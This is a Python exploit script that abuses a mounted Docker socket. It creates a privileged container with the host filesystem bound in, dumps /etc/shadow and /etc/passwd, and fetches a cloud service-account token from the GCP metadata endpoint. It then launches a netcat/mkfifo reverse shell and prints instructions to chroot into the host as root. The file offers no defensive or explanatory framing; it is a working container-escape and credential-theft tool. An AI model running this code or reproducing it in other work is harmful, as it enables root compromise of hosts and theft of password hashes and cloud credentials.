import socket
import sys
import select
import json
import time
import os
import threading

# Configuration
DOCKER_SOCK = "/var/run/docker.sock"
LHOST = "127.0.0.1"
LPORT = 1337
CONTAINER_IMAGE = "alpine"

class DockerClient:
    def __init__(self, socket_path):
        self.socket_path = socket_path

    def raw_request(self, method, endpoint, body=None):
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        try:
            sock.connect(self.socket_path)
            
            # Prepare Body
            json_body = json.dumps(body) if body else ""
            
            # Prepare Headers
            request = f"{method} {endpoint} HTTP/1.1\r\n"
            request += "Host: localhost\r\n"
            request += "Content-Type: application/json\r\n"
            request += f"Content-Length: {len(json_body)}\r\n"
            request += "Connection: close\r\n\r\n"
            request += json_body

            # Send
            sock.sendall(request.encode())

            # Receive
            response_data = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk: break
                response_data += chunk
            
            return response_data.decode('utf-8', errors='ignore')
        finally:
            sock.close()

    def create_container(self, name, cmd):
        self.delete_container(name) # Cleanup first
        
        config = {
            "Image": CONTAINER_IMAGE,
            "Cmd": cmd,
            "HostConfig": {
                "Binds": ["/:/mnt/host"],
                "Privileged": True,
                "NetworkMode": "host"
            },
            "Tty": True
        }
        
        resp = self.raw_request("POST", f"/containers/create?name={name}", config)
        if "Created" in resp or '"Id":' in resp:
            return True
        print(f"[-] Failed to create {name}. Response:\n{resp}")
        return False

    def start_container(self, name):
        self.raw_request("POST", f"/containers/{name}/start")

    def get_logs(self, name):
        # We need to strip HTTP headers from the raw response
        raw_resp = self.raw_request("GET", f"/containers/{name}/logs?stdout=true&stderr=true")
        try:
            # Split headers and body (Double CRLF)
            headers, body = raw_resp.split("\r\n\r\n", 1)
            # Docker logs have a weird binary header (8 bytes) per frame.
            # We will just clean it up textually for display.
            return body
        except ValueError:
            return raw_resp

    def delete_container(self, name):
        self.raw_request("DELETE", f"/containers/{name}?force=true")

def phase_one_loot(docker):
    print(f"\n\033[1;33m[+] PHASE 1: Extracting Host Secrets...\033[0m")
    
    cmd = [
        "/bin/sh", "-c",
        "echo '--- SHADOW FILE ---'; cat /mnt/host/etc/shadow; "
        "echo '--- PASSWD FILE ---'; cat /mnt/host/etc/passwd; "
        "echo '--- IDENTITY TOKEN ---'; apk add --no-cache curl >/dev/null 2>&1 && "
        "curl -s -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
    ]

    if docker.create_container("pwn_loot", cmd):
        docker.start_container("pwn_loot")
        time.sleep(4) # Give it time to install curl and run
        logs = docker.get_logs("pwn_loot")
        
        # Simple cleanup of non-printable chars from Docker log stream
        clean_logs = "".join([c for c in logs if c.isprintable() or c in ['\n', '\r', '\t']])
        print(clean_logs)
        docker.delete_container("pwn_loot")
    else:
        print("[-] Phase 1 Failed.")

def phase_two_shell(docker):
    print(f"\n\033[1;31m[+] PHASE 2: Launching Root Shell (Port {LPORT})...\033[0m")
    
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', LPORT))
    s.listen(1)
    
    def launch_payload():
        time.sleep(2)
        print("[*] Sending Payload to Docker...")
        cmd = [
            "/bin/sh", "-c",
            f"apk add --no-cache netcat-openbsd >/dev/null 2>&1; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {LHOST} {LPORT} > /tmp/f"
        ]
        if docker.create_container("pwn_shell", cmd):
            docker.start_container("pwn_shell")

    thread = threading.Thread(target=launch_payload)
    thread.start()

    print(f"[*] Waiting for connection on {LPORT}...")
    client, addr = s.accept()
    print(f"\033[1;32m[+] Connected! You are now ROOT on {addr}\033[0m")
    print("---------------------------------------------------")
    print("Type 'chroot /mnt/host /bin/bash' to enter Host OS.")
    print("---------------------------------------------------")

    try:
        while True:
            r, _, _ = select.select([client, sys.stdin], [], [])
            if client in r:
                data = client.recv(4096)
                if not data: break
                sys.stdout.write(data.decode('utf-8', 'ignore'))
                sys.stdout.flush()
            if sys.stdin in r:
                cmd = sys.stdin.readline()
                client.send(cmd.encode())
    except KeyboardInterrupt:
        print("\n[*] Exiting...")
        try:
            docker.delete_container("pwn_shell")
        except:
            pass
        s.close()

if __name__ == "__main__":
    if not os.path.exists(DOCKER_SOCK):
        print("[-] Docker socket not found.")
        sys.exit(1)

    docker = DockerClient(DOCKER_SOCK)
    
    try:
        phase_one_loot(docker)
        phase_two_shell(docker)
    except Exception as e:
        print(f"[-] Error: {e}")
